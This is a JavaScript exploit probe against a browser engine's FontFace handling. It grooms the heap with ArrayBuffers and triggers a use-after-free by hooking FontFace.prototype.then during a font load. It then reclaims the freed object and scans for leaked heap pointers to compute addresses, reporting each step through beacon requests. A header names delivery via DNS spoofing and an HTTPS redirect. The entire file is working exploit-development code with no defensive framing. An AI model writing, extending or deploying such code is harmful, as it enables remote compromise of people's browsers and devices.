// PROBE P565: FontFace self-address via heap distance measurement
//
// GOAL: Determine if the leaked engine pointer from FontFace reclaim
//       has a predictable offset to our own ArrayBuffer allocations.
//
// METHOD:
//   1. Groom heap with 200 × 192-byte ArrayBuffers (same size as CSSFontFace)
//   2. Mark each buffer with its index at byte 0
//   3. Trigger FontFace reclaim — engine writes ptr P at +0x58
//   4. P is a fresh WeakHashSet impl allocated AFTER our buffer took the slot
//   5. Measure: does P fall in the range of our groomed buffers?
//   6. If yes, we can compute self-address as P ± known_offset
//
// DELIVERY: host.py DNS spoofing + HTTPS (User Guide redirect)

(() => {
  const B = (tag, extra = '') => {
    new Image().src = '/beacon/P565-' + encodeURIComponent(tag) +
      (extra ? '-' + encodeURIComponent(extra) : '') +
      '?t=' + performance.now().toFixed(0);
  };

  const hexQ = (dv, off) => {
    const lo = dv.getUint32(off, true);
    const hi = dv.getUint32(off + 4, true);
    return hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0');
  };

  const isHeapPtr = (dv, off) => {
    const hi = dv.getUint32(off + 4, true);
    return hi > 0 && hi < 0x7FFF0000; // WebProcess heap range
  };

  B('BOOT');

  // ============================================================
  // PHASE A: Groom heap with 192-byte buffers
  // ============================================================
  const GROOM_COUNT = 200;
  const BUF_SIZE = 192;
  const groomBuffers = [];
  const groomViews = [];

  for (let i = 0; i < GROOM_COUNT; i++) {
    const ab = new ArrayBuffer(BUF_SIZE);
    const u8 = new Uint8Array(ab);
    // Write index marker at offset 180 (away from engine write offsets 0x58/0x68)
    u8[180] = i & 0xFF;
    u8[181] = (i >> 8) & 0xFF;
    u8[182] = 0xAA; // sentinel
    u8[183] = 0xBB; // sentinel
    groomBuffers.push(ab);
    groomViews.push(new DataView(ab));
  }
  B('GROOMED', 'n=' + GROOM_COUNT);

  // ============================================================
  // PHASE B: Setup FontFace trigger
  // ============================================================
  // Create the JS face and the CSS rule
  const f0 = new FontFace('f0', 'local(Arial)');
  document.fonts.add(f0);

  const styleEl = document.createElement('style');
  styleEl.id = 'victim-style';
  styleEl.textContent = '@font-face { font-family: s0; src: local(Arial); unicode-range: U+0041; }';
  document.head.appendChild(styleEl);

  // Hook FontFace.prototype.then
  let reclaimBuffers = [];
  let reclaimViews = [];

  Object.defineProperty(FontFace.prototype, 'then', { configurable: true, get() {
    // Free the CSSFontFace
    styleEl.remove();
    document.fonts.delete(this);
    styleEl.textContent = '';
    // Force layout so the free is not deferred
    document.body.offsetHeight;

    // Reclaim: allocate 192-byte buffers in the freed slot
    for (let i = 0; i < 96; i++) {
      const ab = new ArrayBuffer(BUF_SIZE);
      const u8 = new Uint8Array(ab);
      // Mark with reclaim-specific pattern
      u8[0] = 0; // expect engine to write 1 (RefCounted) here
      u8[180] = 0xCC;
      u8[181] = 0xDD;
      u8[182] = i & 0xFF;
      u8[183] = (i >> 8) & 0xFF;
      reclaimBuffers.push(ab);
      reclaimViews.push(new DataView(ab));
    }
    B('GETTER-RECLAIM', 'n=' + reclaimBuffers.length);
    return undefined;
  }, set(){} });

  B('SETUP-DONE');

  // ============================================================
  // PHASE C: Trigger FontFaceSet::load()
  // ============================================================
  document.fonts.load('1em f0, s0', 'AB');
  B('LOAD-CALLED');

  // ============================================================
  // PHASE D: Scan for the engine write (after 100ms delay)
  // ============================================================
  setTimeout(() => {
    let hitBuf = -1;
    let hitPtr58 = '';
    let hitPtr68 = '';
    let hitRefCount = 0;

    // Scan reclaim buffers for the engine write
    for (let i = 0; i < reclaimViews.length; i++) {
      const dv = reclaimViews[i];
      // Check offset 0: RefCounted counter should be 1
      const rc = dv.getUint32(0, true);
      if (rc === 1) {
        // Check +0x58 and +0x68 for heap pointers
        if (isHeapPtr(dv, 0x58) || isHeapPtr(dv, 0x68)) {
          hitBuf = i;
          hitRefCount = rc;
          hitPtr58 = hexQ(dv, 0x58);
          hitPtr68 = hexQ(dv, 0x68);
          B('HIT', 'b=' + i + ',rc=' + rc + ',p58=' + hitPtr58 + ',p68=' + hitPtr68);
          break;
        }
      }
    }

    if (hitBuf === -1) {
      // Also scan groom buffers (engine might have written to a groom buffer)
      for (let i = 0; i < groomViews.length; i++) {
        const dv = groomViews[i];
        const rc = dv.getUint32(0, true);
        if (rc === 1 && (isHeapPtr(dv, 0x58) || isHeapPtr(dv, 0x68))) {
          hitBuf = 1000 + i; // distinguish from reclaim
          hitPtr58 = hexQ(dv, 0x58);
          hitPtr68 = hexQ(dv, 0x68);
          B('HIT-GROOM', 'b=' + i + ',p58=' + hitPtr58 + ',p68=' + hitPtr68);
          break;
        }
      }
    }

    if (hitBuf === -1) {
      // Count any non-zero bytes across all reclaim buffers
      let nzCount = 0;
      for (let i = 0; i < reclaimViews.length; i++) {
        const u8 = new Uint8Array(reclaimBuffers[i]);
        for (let j = 0; j < 176; j++) { // skip our markers at 180-183
          if (u8[j] !== 0) nzCount++;
        }
      }
      B('NO-HIT', 'nz=' + nzCount);
      B('DONE', 'result=no-leak');
      return;
    }

    // ============================================================
    // PHASE E: Heap distance analysis
    // ============================================================
    // P58 is the WeakHashSet impl, allocated AFTER our reclaim buffer.
    // If allocations are sequential, P58 = reclaimBuf_addr + BUF_SIZE + gap
    // We can't read our own address, but we can probe the DISTANCE:
    //
    // Create a second FontFace trigger to see if the pointer shifts
    // proportionally to our allocation pattern.
    //
    // For now, report the raw values.

    // Check if any groom buffer had its sentinel overwritten
    // (indicating the engine wrote near our groom region)
    let groomHits = 0;
    for (let i = 0; i < groomViews.length; i++) {
      const dv = groomViews[i];
      // Check if sentinel at 182-183 was corrupted
      const s = dv.getUint8(182);
      if (s !== 0xAA) {
        groomHits++;
        if (groomHits <= 5) {
          B('GROOM-CORRUPT', 'i=' + i + ',s=' + s);
        }
      }
    }

    // Scan the hit buffer's full contents for any other non-zero values
    const hitView = hitBuf >= 1000 ? groomViews[hitBuf - 1000] : reclaimViews[hitBuf];
    let nzOffsets = [];
    const u8 = new Uint8Array(hitBuf >= 1000 ? groomBuffers[hitBuf - 1000] : reclaimBuffers[hitBuf]);
    for (let j = 0; j < BUF_SIZE; j++) {
      if (u8[j] !== 0 && j < 180) { // skip our markers
        nzOffsets.push(j);
      }
    }

    // Report non-zero byte positions (max 32)
    const nzSlice = nzOffsets.slice(0, 32).join(',');
    B('NZ-MAP', 'offsets=' + nzSlice);

    // Full qword dump of the hit buffer at key offsets
    const offsets = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38,
                     0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78,
                     0x80, 0x88, 0x90, 0x98, 0xA0, 0xA8, 0xB0];
    for (const off of offsets) {
      if (off + 8 <= BUF_SIZE) {
        const lo = hitView.getUint32(off, true);
        const hi = hitView.getUint32(off + 4, true);
        if (lo !== 0 || hi !== 0) {
          B('QWORD', '+0x' + off.toString(16) + '=' + hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
        }
      }
    }

    // ============================================================
    // PHASE F: Differential heap measurement
    // Allocate MORE buffers AFTER the leak and see if the next
    // FontFace trigger gives a pointer at a predictable distance.
    // ============================================================
    const postLeakBufs = [];
    for (let i = 0; i < 50; i++) {
      postLeakBufs.push(new ArrayBuffer(BUF_SIZE));
    }
    B('POST-ALLOC', 'n=50');

    // Parse the leaked pointer P58
    const p58Lo = hitView.getUint32(0x58, true);
    const p58Hi = hitView.getUint32(0x5C, true);

    B('DONE', 'result=leak,b=' + hitBuf +
      ',p58=' + hitPtr58 + ',p68=' + hitPtr68 +
      ',groomCorrupt=' + groomHits +
      ',nzCount=' + nzOffsets.length);

  }, 120); // 120ms to let engine continuation write

  // Watchdog
  setTimeout(() => { B('ALIVE-5s'); }, 5000);
})();
